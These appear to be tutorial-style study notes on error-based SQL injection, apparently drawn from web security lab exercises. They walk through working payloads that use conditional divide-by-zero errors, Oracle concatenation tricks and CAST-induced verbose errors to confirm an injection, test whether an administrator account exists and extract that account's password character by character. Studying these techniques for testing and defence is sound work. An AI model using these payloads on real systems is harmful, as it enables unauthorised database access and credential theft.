Error-Based SQL injections refer to cases when we can use error messages to either extract or infer sensitive data from the database, even in a blind situation.

__Exploiting blind SQL Injections by triggering conditional errors__
- Suppose two requests are sent containing the following `TrackingId` cookie values in them
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
- In the first input `CASE` always evaluates to `'a'`, so not error.
- The second input evaluates to `1/0`, which causes a divide-by-zero error.
- If the error causes a difference in the HTTP response we can use this to determine whether the injected condition is true.
- Using this technique we can retrieve data by testing one character at a time.
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
- The above injection gives a error when the desired character is below or over a character allowing us to analyse characters of passwords.

__Error-Based SQL Injection in Oracle__
- The following injection if successful can verify the existence of Error-based SQL injections in Oracle databases
```
TrackingId=xyz'||(SELECT '')||'
```
- The above injection results in the following SQL query
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz'||(SELECT '' FROM dual)||''
```
- The expression on the other side evaluates to `'xyz'` the `||` operator is for concatenation.
- The `dual` table is the default dummy table in Oracle databases.
- To verify the existence of a column use the following injection
```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```
- `ROWNUM = 1` is their to make sure only one column is returned so that our concatenation is not broken.
- The following injection if shows error can be used to verify injection
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
- This selects either `TO_CHAR(1/0)` from `dual` or `''` from `dual`, if this returns a error the application is vulnerable.
- The above injection results in the following SQL query
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||''
```
- Change the `(1=1)` to `(1=2)` and the error should disappear.
- Now we can do an error on the basis of whether a condition is true.
- We can check whether a certain user or entry exists as follows
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- If an error occurs then the user exists, `SELECT` tries to select from the `users` column were `username` is administrator, if administrator does not exist nothing is returned resulting in no errors.
- Similarly we can check the length of the password as follows
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- Keep increasing `1` till error disappears.
- Then we can brute-force each character of the password as follows
```
xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- Using burp intruder, if error occurs then the character guesses is correct.

__Extracting sensitive data via verbose SQL error messages__
- Database misconfiguration can result in in verbose SQL error messages, this can provide information to attackers. Consider the following error message, which occurs after injecting a single quote into the `id` parameter
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
- This shows us the full query that the application has constructed using our input, this makes it easier to create a malicious payload in a valid query.
- We may be able to induce an application to generate and error message that contains some data that is returned by the query.
- We can use the `CAST()` function to achieve this, it enables us to convert one type to another, for example imagine a query as such
```
CAST((SELECT example_column FROM example_table) AS int)
```
- Often the data we are trying to read is a string and is incompatible with `int`, this may cause an error as follows
```
ERROR: invalid input syntax for type integer: "Example Data"
```
- This query is useful if a character limit prevents us from triggering conditional responses.
- Something in action might look like this
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Something like the following can also be used 
```
' AND (SELECT CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator' AND ROWNUM=1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```